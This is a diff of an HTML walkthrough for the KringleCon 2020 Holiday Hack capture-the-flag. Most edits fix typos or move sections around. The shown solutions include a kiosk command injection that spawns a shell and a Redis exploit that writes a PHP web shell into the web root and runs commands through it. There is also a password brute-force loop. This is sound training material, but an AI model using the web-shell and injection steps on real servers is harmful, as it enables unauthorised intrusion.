-The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.  </p>
-<p>Approved:
+                Father Time
+
+Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting.
+
+Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.
+
+OLD BUSINESS: No Old Business.
+
+RESOLUTIONS:
+The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.  
+
+Approved:
 Mother Nature
 Superman
 Clarice
@@ -709,12 +716,15 @@ Krampus
 Dolly
 Snow Miser
 Alabaster Snowball
-Queen of the Winter Spirits</p>
-<p>Opposed: 
-                Jack Frost</p>
-<p>Resolution carries.  Construction approved.</p>
-<p>NEW BUSINESS:
-```</p>
+Queen of the Winter Spirits
+
+Opposed: 
+                Jack Frost
+
+Resolution carries.  Construction approved.
+
+NEW BUSINESS:
+</code></pre>
 <p>ANSWER: Tanta Kringle</p></section><section class="print-page" id="objectives-10-defeat-fingerprint-sensor-10-defeat-fingerprint-sensor"><h1 id="objectives-10-defeat-fingerprint-sensor-10-defeat-fingerprint-sensor-10-defeat-fingerprint-sensor">10) Defeat Fingerprint Sensor</h1>
 <p>Dificulty: 3/5</p>
 <p><img alt="Difficulty" src="../img/Dificulty3.png" /></p>
@@ -765,8 +775,8 @@ Queen of the Winter Spirits</p>
 <p>The blockchain naughty list <code>blockchain.dat</code> file can download Santa's office.</p>
 <p><a href="#objectives-11a-blockchain-part-1-blockchain.dat">Block chain file</a></p>
 <h2 id="objectives-11a-blockchain-part-1-11a-blockchain-part-1-pseudo-random-number-predictor">Pseudo random number predictor</h2>
-<p>There is a tool from Tom Liston to help predict pseudo-random numbers using MT19937 at https://github.com/tliston/mt19937
-An easier to addpt tool can be downloaded from https://github.com/kmyk/mersenne-twister-predictor.git</p>
+<p>There is a tool from Tom Liston to help predict pseudo-random numbers using MT19937 at https://github.com/tliston/mt19937.
+An easier to adapt tool can be downloaded from https://github.com/kmyk/mersenne-twister-predictor.git</p>
 <h2 id="objectives-11a-blockchain-part-1-11a-blockchain-part-1-extracting-the-nonces-of-the-block">Extracting the nonces of the block</h2>
 <p>The function <code>load_a_block</code> of the provided python script can be modified to print the nonces of all blocks on the chain.</p>
 <p><a href="#objectives-11a-blockchain-part-1-11a.py">Modified naugthy_nice.py script</a></p>
@@ -797,7 +807,7 @@ An easier to addpt tool can be downloaded from https://github.com/kmyk/mersenne-
 844f6b07bd9403e4
 57066318f32f729d
 </code></pre>
-<p>ANSWER: 57066318f32f729d</p></section><section class="print-page" id="objectives-11b-blockchain-part-2-11b-blockchain-part-2"><h1 id="objectives-11b-blockchain-part-2-11b-blockchain-part-2-11b-naughtynice-list-with-blockchain-investigation-part-2">11b) Naughty/Nice List with Blockchain Investigation Part 2</h1>
+<p>ANSWER: <code>57066318f32f729d</code></p></section><section class="print-page" id="objectives-11b-blockchain-part-2-11b-blockchain-part-2"><h1 id="objectives-11b-blockchain-part-2-11b-blockchain-part-2-11b-naughtynice-list-with-blockchain-investigation-part-2">11b) Naughty/Nice List with Blockchain Investigation Part 2</h1>
 <p>Difficulty: 5/5</p>
 <p><img alt="Difficulty" src="../img/Dificulty5.png" /></p>
 <p>The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?</p>
@@ -939,7 +949,7 @@ PDF attack byte fixed!!!
 
 SOLUTION MD5:b10b4a6bd373b61f32f4fd3a0cdfbf84 and SHA256:fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb
 </code></pre>
-<p>ANSWER: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb</p>
+<p>ANSWER: <code>fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb</code></p>
 <p><img alt="Defrosted document" src="../objectives/11b-Blockchain-Part-2/FrostRecovered.png" /></p></section><section class="print-page" id="achivements-a-unescape-tmux-a-unescape-tmux"><h1 id="achivements-a-unescape-tmux-a-unescape-tmux-unescape-tmux">Unescape Tmux</h1>
 <p>Can you help me?</p>
 <p>I was playing with my birdie (she's a Green Cheek!) in something called tmux,
@@ -947,7 +957,7 @@ then I did something and it disappeared!</p>
 <p>Can you help me find her? We were so attached!!</p>
 <p><img alt="Access" src="../achivements/A-Unescape-Tmux/A-Unescape-Tmux-access.png" /></p>
 <h2 id="achivements-a-unescape-tmux-a-unescape-tmux-solution">Solution</h2>
-<p>This achivement gets unlocked with any of the following commands:</p>
+<p>This achievement gets unlocked with any of the following commands:</p>
 <pre><code>tmux attach
 </code></pre>
 <pre><code>tmux ls
@@ -955,8 +965,28 @@ tmux -S /tmp/tmux-1000/default attach -t 0
 </code></pre>
 <pre><code>/var/go.sh
 </code></pre>
-<p><img alt="Solution" src="../achivements/A-Unescape-Tmux/A-Unescape-Tmux-solution.png" /></p></section><section class="print-page" id="achivements-a-elf-code-a-elf-code"><h1 id="achivements-a-elf-code-a-elf-code-the-elf-code">The ELF Code</h1>
-<p>This is a web game that has multiple levels with progressive complexioty and to solve requires coding the avatar movements in javascript.</p>
+<p><img alt="Solution" src="../achivements/A-Unescape-Tmux/A-Unescape-Tmux-solution.png" /></p></section><section class="print-page" id="achivements-a-kringle-kiosk-a-kringle-kiosk"><h1 id="achivements-a-kringle-kiosk-a-kringle-kiosk-kiosk-escape-to-shell">Kiosk escape to shell</h1>
+<p>Option 4 gives a  hint that special characters may cause errors, after trying to execute <code>/bin/bash</code> in between back ticks "`" it seems it works but we receive no output to the console so we try again to redirect the stdout to stderror</p>
+<p><img alt="Access" src="../achivements/A-Kringle-kiosk/A-KringleKiosk-access.png" /></p>
+<p><img alt="Welcome" src="../achivements/A-Kringle-kiosk/A-KringleKiosk-welcome.png" /></p>
+<h2 id="achivements-a-kringle-kiosk-a-kringle-kiosk-escaping-to-shell">Escaping to shell</h2>
+<p>Using back ticks can be used to execute shell comamnds but the output is being filtered, so to show the output we redirect the <code>stdout</code> to <code>stderr</code></p>
+<pre><code>`/bin/bash 1&gt;&amp;2`
+</code></pre>
+<p>And we escape to the shell.</p>
+<pre><code>   ___                                                      _    
+  / __|   _  _     __      __      ___     ___     ___     | |   
+  \__ \  | +| |   / _|    / _|    / -_)   (_-&lt;    (_-&lt;     |_|   
+  |___/   \_,_|   \__|_   \__|_   \___|   /__/_   /__/_   _(_)_  
+_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; | 
+&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-' 
+
+Type 'exit' to return to the menu.
+
+shinny@9bf4b0fee057:~$
+</code></pre>
+<p><img alt="Solution" src="../achivements/A-Kringle-kiosk/A-KringleKiosk-solution.png" /></p></section><section class="print-page" id="achivements-a-elf-code-a-elf-code"><h1 id="achivements-a-elf-code-a-elf-code-the-elf-code">The ELF Code</h1>
+<p>This is a web game that has multiple levels with progressive complexity and to solve requires coding the avatar movements in javascript.</p>
 <p><img alt="Access" src="../achivements/A-Elf-Code/A-Elf-Code-access.png" /></p>
 <h1 id="achivements-a-elf-code-a-elf-code-solution">Solution</h1>
 <h2 id="achivements-a-elf-code-a-elf-code-level-1">Level 1</h2>
@@ -1023,7 +1053,7 @@ this.lollipop_coords.length==0
 <li>4 bedDURRdunditty</li>
 <li>5 SCHHRRHHRTHRTR</li>
 </ul>
-<p>Once the handhake is completed the tree lights will turn on and performing the same challenge again will change the tree lights to a different color.</p></section><section class="print-page" id="achivements-a-redis-a-redis"><h1 id="achivements-a-redis-a-redis-redis">Redis</h1>
+<p>Once the handshake is completed the tree lights will turn on and performing the same challenge again will change the tree lights to a different color.</p></section><section class="print-page" id="achivements-a-redis-a-redis"><h1 id="achivements-a-redis-a-redis-redis">Redis</h1>
 <p>We need your help!!</p>
 <p>The server stopped working, all that's left is the maintenance port.</p>
 <p>To access it, run:</p>
@@ -1031,7 +1061,7 @@ this.lollipop_coords.length==0
 <p>We're pretty sure the bug is in the index page. Can you some</p>
 <p><img alt="Access" src="../achivements/A-Redis/A-Redis-access.png" /></p>
 <h2 id="achivements-a-redis-a-redis-solution">Solution</h2>
-<p>The redis console in the kitchen has a vulnerability that allows to dump the contents of the databse to a file in the file system. To simplify the execution of payloads we can build a helper function as follows:</p>
+<p>The redis console in the kitchen has a vulnerability that allows to dump the contents of the database to a file in the file system. To simplify the execution of payloads we can build a helper function as follows:</p>
 <pre><code>function cmd {
   curl &quot;localhost/maintenance.php?cmd=$1&quot;
   }
@@ -1048,7 +1078,7 @@ cmd save
 Running: redis-cli --raw -a '&lt;password censored&gt;' 'save'
 OK
 </code></pre>
-<p>The php file will contain some REDIS database headers but those do not stop PHP from executing the rest of the code</p>
+<p>The php file will contain some REDIS database headers but those do not stop PHP from executing the rest of the code.</p>
 <pre><code>curl localhost/1.php --output -
 REDIS0009�      redis-ver5.0.3�
 �edis-bits�@�ctime�Km�_used-mem�(
@@ -1087,14 +1117,14 @@ echo $result;
 ?&gt;
 </code></pre>
 <h2 id="achivements-a-redis-a-redis-full-rce">Full RCE</h2>
-<p>We can achive upload a simple RCE php with the following sequence.
+<p>We can achieve upload a simple RCE php with the following sequence.
 1. Load our helper function to simplify the exploitation</p>
 <pre><code>function cmd {
   curl &quot;localhost/maintenance.php?cmd=$1&quot;
   }
 </code></pre>
 <ol>
-<li>Flush the database to avoid undesired content, configure redis to store out databse content into a php file and save the database.</li>
+<li>Flush the database to avoid undesired content, configure redis to store out database content into a php file and save the database.</li>
 </ol>
 <pre><code>cmd flushall
 cmd config,set,dir,/var/www/html
@@ -1107,31 +1137,13 @@ cmd save
 </ol>
 <pre><code>curl localhost/rce.php?cmd=ls --output -
 </code></pre>
-<p>Spaces have to be replaced with <code>+</code> or <code>%20</code> to succeed.</p>
+<ul>
+<li>Spaces have to be replaced with <code>+</code> or <code>%20</code> to succeed.</li>
+</ul>
 <pre><code>curl localhost/rce.php?cmd=ls%20-al --output -
 </code></pre>
-<p><img alt="Solution" src="../achivements/A-Redis/A-Redis-solution.png" /></p></section><section class="print-page" id="achivements-a-kringle-kiosk-a-kringle-kiosk"><h1 id="achivements-a-kringle-kiosk-a-kringle-kiosk-escape-to-shell">Escape to shell</h1>
-<p>Option 4 gives a  hint that special characters may cause errors, after trying to execute <code>/bin/bash</code> in between back ticks "`" it seems it works but we receive no output to the console so we try again to redirect the stdout to stderror</p>
-<p><img alt="Access" src="../achivements/A-Kringle-kiosk/A-KringleKiosk-access.png" /></p>
-<p><img alt="Welcome" src="../achivements/A-Kringle-kiosk/A-KringleKiosk-welcome.png" /></p>
-<h2 id="achivements-a-kringle-kiosk-a-kringle-kiosk-escaping-to-shell">Escaping to shell</h2>
-<p>Using back ticks can be used to execute shell comamnds but the output is being filtered so to show the output we redirect the <code>stdout</code> to <code>stderr</code></p>
-<pre><code>`/bin/bash 1&gt;&amp;2`
-</code></pre>
-<p>And we escape to the shell.</p>
-<pre><code>   ___                                                      _    
-  / __|   _  _     __      __      ___     ___     ___     | |   
-  \__ \  | +| |   / _|    / _|    / -_)   (_-&lt;    (_-&lt;     |_|   
-  |___/   \_,_|   \__|_   \__|_   \___|   /__/_   /__/_   _(_)_  
-_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; | 
-&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-' 
-
-Type 'exit' to return to the menu.
-
-shinny@9bf4b0fee057:~$
-</code></pre>
-<p><img alt="Solution" src="../achivements/A-Kringle-kiosk/A-KringleKiosk-solution.png" /></p></section><section class="print-page" id="achivements-a-linux-primer-a-linux-primer"><h1 id="achivements-a-linux-primer-a-linux-primer-linux-primer">Linux Primer</h1>
-<p>This challenge requires to perform a serie of tasks in the linux command line</p>
+<p><img alt="Solution" src="../achivements/A-Redis/A-Redis-solution.png" /></p></section><section class="print-page" id="achivements-a-linux-primer-a-linux-primer"><h1 id="achivements-a-linux-primer-a-linux-primer-linux-primer">Linux Primer</h1>
+<p>This challenge requires to perform a series of tasks in the linux command line</p>
 <p><img alt="Access" src="../achivements/A-Linux-Primer/A-Linux-Primer-access.png" /></p>
 <h3 id="achivements-a-linux-primer-a-linux-primer-task-1">task 1</h3>
 <p>Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop!</p>
@@ -1264,7 +1276,7 @@ password is probably stored right in the binary. There's gotta be a
 Be sure to finish the challenge in prod: And don't forget, the password is &quot;Op3nTheD00r&quot;
 Beep boop invalid password
 </code></pre>
-<p>The to unlock the achivement we simply run the binary and enter the discovered password.</p>
+<p>The to unlock the achievement we simply run the binary and enter the discovered password.</p>
 <pre><code>elf@85c9114a15a1 ~ $ ./door 
 You look at the screen. It wants a password. You roll your eyes - the 
 password is probably stored right in the binary. There's gotta be a
@@ -1279,7 +1291,7 @@ Door opened!
 <p><img alt="Door" src="../achivements/A-Speaker-UNPrep/A-Speaker-UNPrep-door-solution.png" /></p>
 <h2 id="achivements-a-speaker-unprep-a-speaker-unprep-lights-challenge">Lights challenge</h2>
 <p>The <code>lights</code> binary uses a complementary <code>lights.conf</code> file that contains two fields <code>name</code> and <code>password</code>, after entering the string in cyberchef it did not get much out of it but the hints tells you can modify the files in <code>/lab</code> so we use teh same string that is in the <code>password</code> for the <code>name</code> and after running the challenge again it greets us with the password <code>Computer-TurnLightsOn</code>.</p>
-<p>To unlock the achivement we run the challenge using the password.</p>
+<p>To unlock the achievement, we run the challenge using the password.</p>
 <pre><code>elf@85c9114a15a1 ~ $ ./lights 
 The speaker unpreparedness room sure is dark, you're thinking (assuming
 you've opened the door; otherwise, you wonder how dark it actually is)
@@ -1299,12 +1311,12 @@ Lights on!
 </code></pre>
 <p>ANSWER: <code>Computer-TurnLightsOn</code></p>
 <p><img alt="Lights" src="../achivements/A-Speaker-UNPrep/A-Speaker-UNPrep-lights-solution.png" /></p>
-<h2 id="achivements-a-speaker-unprep-a-speaker-unprep-vendingmachine-challenge">Vendingmachine challenge</h2>
+<h2 id="achivements-a-speaker-unprep-a-speaker-unprep-vending-machine-challenge">Vending-machine challenge</h2>
 <p>The vending machine does not unencrypt the password as the <code>lights</code> challenges but if the <code>vending-machines.json</code> configuration file is delted it asks for a user and passwords and creates a new file.</p>
 <p>After entering a long password <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code> it becomes evident that the same string repeats over and over giving which is a tell that we may be dealing with simple <code>XOR</code> or substitution mechanism in the back.</p>
-<p>For example when entering only <code>A</code>'s, tThe string that kept repeating is <code>XiGRehmw</code> in hex will be <code>19 28 06 13 24 29 2c 36</code>, but its different that the one when using only <code>B</code> but it kept the patter of repetition every eight characters.</p>
+<p>For example, when entering only <code>A</code>'s, the string that kept repeating is <code>XiGRehmw</code> in hex will be <code>19 28 06 13 24 29 2c 36</code>, but it's different that the one when using only <code>B</code> but it kept the patter of repetition every eight characters.</p>
 <p>To make this quick lets simply loop thru the alphabet and numbers.</p>
-<p>The bruteforcing loop:</p>
+<p>The brute forcing loop:</p>
 <pre><code>for p in `python -c 'for x in range(48,123): print(chr(x)*8)'`; do rm vending-machines.json ; echo -e &quot;${p}\n${p}\n${p}\n&quot; | ./vending-machines ;echo &quot; test: $p&quot;; grep pass vending-machines.json ; done |egrep &quot;test:|password&quot; &gt; bruteforcer.txt
 </code></pre>
 <p>Now to find the what character was entered that matched the exact position of the password we use simple regular expressions to get the value of the nth character matching <code>LVEdQPpBwr</code> in the <code>vending-machines.json</code> , once we get to the 8th character we search for the next chanacter at the 1st position as the pattern loops every 8 characters.</p>
@@ -1350,7 +1362,7 @@ elf@85c9114a15a1 ~/lab $ grep -B1 &quot;  \&quot;password\&quot;: \&quot;.r&quot
 <p><img alt="Vending Machines" src="../achivements/A-Speaker-UNPrep/A-Speaker-UNPrep-vendingmachines-solution.png" /></p></section><section class="print-page" id="achivements-a-snowball-a-snowball"><h1 id="achivements-a-snowball-a-snowball-snowball-game">Snowball game</h1>
 <p><img alt="Access" src="../achivements/A-Snowball/A-Snowball-access.png" /></p>
 <p>The snowball game in the easy level will generate the same layout over and over if the same name is used, in the hard level you cannot pick the name, it is automatically assigned to an integer number, if that same name is entered in another tab in the easy level the easy level will also have the exact same layout.</p>
-<p>In the impossible level you cannot see the name but in the source code of the /game page you can see a list of 623 integers except the last one which is the choosen one to generate the layout.</p>
+<p>In the impossible level you cannot see the name but in the source code of the /game page you can see a list of 623 integers except the last one which is the chosen one to generate the layout.</p>
 <p><a href="#achivements-a-snowball-mt19937predictorsnowball.py">Random predict script</a></p>
 <p>Using the same MT19937 predictor as in challenge 11a as template, we enter the list of numbers in a text file and generate the next random and then open a new tab using that as name in the easy level. At this point we only need to take note of layout of the game at the easy level and use that to win the Impossible level!</p>
 <h2 id="achivements-a-snowball-a-snowball-random-prediction">Random prediction</h2>
@@ -1372,7 +1384,7 @@ d5f31c25
 3589479461
 </code></pre>
 <h2 id="achivements-a-snowball-a-snowball-solved-challenge">Solved challenge</h2>
-<p>Use the predicted missing code <code>3589479461</code> in this case, and use it in another window in the <code>Easy</code> level at the Snowball challenge source page https://snowball2.kringlecastle.com/, to have the achivement unlocked the game should be won at the impossible level inside the <code>iframe</code> on the kringlecon page.</p>
+<p>Use the predicted missing code <code>3589479461</code> in this case, and use it in another window in the <code>Easy</code> level at the Snowball challenge source page https://snowball2.kringlecastle.com/, to have the achievement unlocked the game should be won at the impossible level inside the <code>iframe</code> on the kringlecon page.</p>
 <p><img alt="Solved" src="../achivements/A-Snowball/A-Snowball-impossible.png" /></p></section><section class="print-page" id="achivements-a-sort-o-matic-a-sort-o-matic"><h1 id="achivements-a-sort-o-matic-a-sort-o-matic-sort-o-matic">Sort-O-Matic</h1>
 <p>This challenge requires multiple regular expressions to filter values.</p>
 <p><img alt="Access" src="../achivements/A-Sort-O-Matic/A-Sort-O-Matic-access.png" /></p>
@@ -1474,6 +1486,7 @@ We'd like to encode another key mechanism.</p>
 <p>Find the decimal portion of the timestamp of the UNLOCK code in candump.log
 and submit it to ./runtoanswer!  (e.g., if the timestamp is 123456.112233,
 please submit 112233)</p>
+<p><img alt="Access" src="../achivements/A-CAN-Bus-Investigation/A-CAN-Bus-Investigation-access.png" /></p>
 <h2 id="achivements-a-can-bus-investigation-a-can-bus-investigation-solution">Solution</h2>
 <p>The candump.log has many events but there are only three different ID in it.</p>
 <pre><code>elf@e9d6693bd207:~$ awk '{print $NF}' candump.log |cut -d\# -f1 |sort |uniq -c 
@@ -1481,7 +1494,7 @@ please submit 112233)</p>
       3 19B
    1331 244
 </code></pre>
-<p>Also those with id <code>19B</code> are longer than the rest, so simple grep using a regular expression to filter the events with at least 11 characters will yield the <code>LOCK</code> and <code>UNLOCK</code> events that can also be confirmed in the Santa Sleigh. </p>
+<p>Also, those with id <code>19B</code> are longer than the rest, so simple grep using a regular expression to filter the events with at least 11 characters will yield the <code>LOCK</code> and <code>UNLOCK</code> events that can also be confirmed in the Santa Sleigh. </p>
 <pre><code>elf@e9d6693bd207:~$ egrep '#.{11}' candump.log 
 (1608926664.626448) vcan0 19B#000000000000
 (1608926671.122520) vcan0 19B#00000F000000
@@ -1496,7 +1509,8 @@ Your answer: 122520
 
 Checking....
 Your answer is correct!
-</code></pre></section><section class="print-page" id="credits"><h1 id="credits-narrative">Narrative</h1>
+</code></pre>
+<p><img alt="Solution" src="../achivements/A-CAN-Bus-Investigation/A-CAN-Bus-Investigation-solution.png" /></p></section><section class="print-page" id="credits"><h1 id="credits-narrative">Narrative</h1>
 <p>The narrative is revealed gradually with every objective that is solved.</p>
 <p>Full narrative:</p>
 <pre><code>KringleCon back at the castle, set the stage...
@@ -1516,7 +1530,7 @@ Holiday Hackers, they're no slackers, returned Jack a big, old null!
 </code></pre>
 <p><img alt="Narrative" src="../img/finalnarrative.png" /></p>
 <h1 id="credits-credits">Credits</h1>
-<p>Once all objectrives are solved, heading back to the balcony in santa's office reveals the final credits and a  link to buy the official KringleCon swag.</p>
+<p>Once all objectives are solved, heading back to the balcony in santa's office reveals the final credits and a  link to buy the official KringleCon swag.</p>
 <p><img alt="Credits" src="../img/finalcredits.png" /></p></section></div>
               
             </div>
